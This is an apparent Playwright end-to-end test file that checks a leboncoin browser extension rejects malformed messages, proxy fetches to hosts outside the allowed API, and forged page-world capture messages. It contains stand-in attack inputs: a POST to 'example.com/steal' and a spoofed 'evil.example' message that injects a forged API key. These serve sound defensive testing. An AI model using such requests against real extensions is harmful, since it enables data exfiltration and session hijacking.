// E2E — adversarial security scenarios for hardened controls.
// Verifies malformed runtime messages, hostile proxy attempts, and forged
// page-world capture messages are fail-closed and do not poison session state.

import { test, expect } from "@playwright/test";
import { launchWithExtension, openExtensionPage, swEval } from "./helpers/launch-extension.js";
import { E2E_API_ORIGIN, E2E_WEB_ORIGIN } from "./helpers/domains.js";

const FIXTURE_KEY = "e2e-fixture-api-key-0123456789abcdef0123456789abcdef";
const FORGED_KEY = "forged-attacker-key-abcdefghijklmnopqrstuvwxyz123456";

test.describe.configure({ mode: "serial" });

let env;
let extPage;

test.beforeAll(async () => {
  env = await launchWithExtension();
  extPage = await openExtensionPage(env.context, env.extensionId, "src/dashboard/dashboard.html");
});

test.afterAll(async () => {
  await extPage?.close();
  await env?.cleanup();
});

async function readSessionKey() {
  return swEval(env.serviceWorker, async () => {
    return new Promise((resolve) => {
      const req = indexedDB.open("lbc-hunter-db");
      req.onsuccess = () => {
        const db = req.result;
        if (!db.objectStoreNames.contains("session")) {
          db.close();
          return resolve(null);
        }
        const tx = db.transaction("session", "readonly");
        const g = tx.objectStore("session").get("current");
        g.onsuccess = () => {
          db.close();
          resolve(g.result?.api_key ?? null);
        };
        g.onerror = () => {
          db.close();
          resolve(null);
        };
      };
      req.onerror = () => resolve(null);
    });
  });
}

test("rejects malformed runtime envelopes and increments blocked_message_envelope counter", async () => {
  const badResponse = await extPage.evaluate(() => chrome.runtime.sendMessage({ nope: true }));
  expect(badResponse.ok).toBe(false);
  expect(badResponse.error).toBe("invalid_message");

  await extPage.waitForTimeout(100);
  const status = await extPage.evaluate(() => chrome.runtime.sendMessage({ type: "GET_STATUS" }));
  expect(status.ok).toBe(true);
  expect(status.securityCounters?.blocked_message_envelope || 0).toBeGreaterThan(0);
});

test("blocks hostile EXECUTE_FETCH target outside api.leboncoin.fr and tracks blocked_proxy_request", async () => {
  const lbcPage = await env.context.newPage();
  await lbcPage.goto(`${E2E_WEB_ORIGIN}/`);

  await lbcPage.waitForTimeout(200);
  const response = await swEval(env.serviceWorker, async (webOrigin) => {
    const tabs = await chrome.tabs.query({ url: [`${webOrigin}/*`] });
    const tab = tabs[0];
    if (!tab?.id) return { ok: false, error: "no_lbc_tab" };
    return chrome.tabs.sendMessage(tab.id, {
      type: "EXECUTE_FETCH",
      url: "https://example.com/steal",
      options: {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ attacker: true }),
      },
    });
  }, E2E_WEB_ORIGIN);

  expect(response.ok).toBe(false);
  expect(response.error).toBe("blocked_non_lbc_url");

  await lbcPage.waitForTimeout(120);
  const status = await extPage.evaluate(() => chrome.runtime.sendMessage({ type: "GET_STATUS" }));
  expect(status.securityCounters?.blocked_proxy_request || 0).toBeGreaterThan(0);

  await lbcPage.close();
});

test("ignores forged page-world capture messages that spoof api host substrings", async () => {
  const lbcPage = await env.context.newPage();
  await lbcPage.goto(`${E2E_WEB_ORIGIN}/`);

  for (let i = 0; i < 30; i++) {
    await lbcPage.waitForTimeout(100);
    const key = await readSessionKey();
    if (key) break;
  }

  await lbcPage.evaluate(
    ({ forged, apiOrigin }) => {
      const apiHost = new URL(apiOrigin).host;
      const origin = window.location.origin;
      const spoofed = `https://evil.example/?hint=${apiHost}`;
      window.postMessage(
        {
          type: "__LBCH_CAPTURED__",
          url: spoofed,
          headers: { api_key: forged },
        },
        origin,
      );
    },
    { forged: FORGED_KEY, apiOrigin: E2E_API_ORIGIN },
  );

  await lbcPage.waitForTimeout(200);
  const apiKey = await readSessionKey();

  expect(apiKey).toBe(FIXTURE_KEY);
  expect(apiKey).not.toBe(FORGED_KEY);

  await lbcPage.close();
});
